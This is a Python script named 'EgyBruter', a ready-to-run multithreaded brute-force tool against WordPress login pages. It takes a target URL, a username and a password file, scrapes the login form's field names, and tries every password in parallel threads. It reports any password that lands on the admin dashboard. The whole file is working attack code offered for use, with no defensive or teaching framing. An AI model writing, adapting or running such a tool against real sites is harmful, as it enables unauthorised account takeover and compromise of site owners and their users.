import requests
import concurrent.futures
import socket
import pyfiglet
import time
import os
import threading
from bs4 import BeautifulSoup
from colorama import init, Fore

init(autoreset=True)

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/58.0.3029.110 Safari/537.3"
)

class ConsoleLock:
    def __init__(self):
        self.lock = threading.Lock()

    def print(self, color, message):
        with self.lock:
            print(color + message)

def check_connection(url):
    try:
        with requests.get(url, headers={'User-Agent': USER_AGENT}, timeout=5) as response:
            response.raise_for_status()
            return response
    except requests.RequestException as e:
        print(Fore.YELLOW + f"Failed to connect to the target: {e}")
    except Exception as ex:
        print(Fore.RED + f"An unexpected error occurred while connecting: {ex}")
    return None

def login(target_url, form_params, username, password, console_lock):
    login_url = target_url
    data = {form_params['username']: username, form_params['password']: password}
    try:
        with requests.post(login_url, data=data, headers={'User-Agent': USER_AGENT}, timeout=5) as response:
            if 'wp-admin' in response.url:  # Change this condition based on target website behavior
                console_lock.print(Fore.GREEN, f"\nLogin successful!\nUsername: {username}\nPassword: {password}\n")
                return True
            else:
                console_lock.print(Fore.RED, f"Failed attempt - Password: {password}")
    except requests.RequestException as e:
        console_lock.print(Fore.YELLOW, f"An error occurred during login attempt: {e}")
    except Exception as ex:
        console_lock.print(Fore.RED, f"An unexpected error occurred during login attempt: {ex}")
    return False

def print_glowing_logo(logo):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for i in range(2):
        os.system('clear' if os.name == 'posix' else 'cls')
        color = colors[i % len(colors)]
        print(color + logo)
        time.sleep(0.3)

def brute_force(target_url, username, password_list, num_threads):
    logo = pyfiglet.figlet_format("EgyBruter", font="slant")
    print_glowing_logo(logo)

    console_lock = ConsoleLock()

    print(Fore.GREEN + "WordPress Brute Force Script\nby AliElTop\n")

    # Check connection to the target
    console_lock.print(Fore.CYAN, "Checking connection to the target...")
    response = check_connection(target_url)
    if response is None:
        console_lock.print(Fore.RED, "Failed to connect to the target. Please check the URL and try again.")
        return

    console_lock.print(Fore.CYAN, "Target information:")
    console_lock.print(Fore.CYAN, f"URL: {response.url}")
    console_lock.print(Fore.CYAN, f"Status Code: {response.status_code}")
    console_lock.print(Fore.CYAN, f"Server: {response.headers.get('Server', 'N/A')}")
    console_lock.print(Fore.CYAN, f"IP Address: {socket.gethostbyname(response.url.split('//')[-1].split('/')[0])}\n")

    # Fetch the login page HTML to inspect the form parameters
    login_page_html = response.text
    soup = BeautifulSoup(login_page_html, 'html.parser')
    form_params = {}
    form = soup.find('form')
    if form:
        for input_tag in form.find_all('input'):
            param_name = input_tag.get('name')
            if param_name and param_name not in ['submit', 'Submit']:
                form_params[param_name] = input_tag.get('value', '')

    if not form_params:
        console_lock.print(Fore.RED, "Failed to auto-detect form parameters for login.")
        return

    console_lock.print(Fore.CYAN, "Auto-detected form parameters for login:")
    for param_name, param_value in form_params.items():
        console_lock.print(Fore.CYAN, f"{param_name}: {param_value}")

    console_lock.print(Fore.GREEN, f"\nStarting brute force attack on {target_url}...")
    console_lock.print(Fore.GREEN, f"Username: {username}")
    console_lock.print(Fore.GREEN, f"Total passwords to try: {len(password_list)}\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(login, target_url, form_params, username, password, console_lock) for password in password_list]
        for _ in concurrent.futures.as_completed(futures):
            pass

    console_lock.print(Fore.RED, "\nBrute force attack completed. No valid password found.")
    console_lock.print(Fore.RED, "Please try a different password list or target URL.")

def main():
    target_url = input(Fore.YELLOW + "Enter the target URL (WordPress login page): ")
    username = input(Fore.YELLOW + "Enter the username: ")

    password_file = input(Fore.YELLOW + "Enter the path to the file containing passwords (one per line): ")
    with open(password_file, 'r') as file:
        password_list = [line.strip() for line in file]

    num_threads = int(input(Fore.YELLOW + "Enter the number of threads to use (recommend 10): "))

    brute_force(target_url, username, password_list, num_threads)

if __name__ == "__main__":
    main()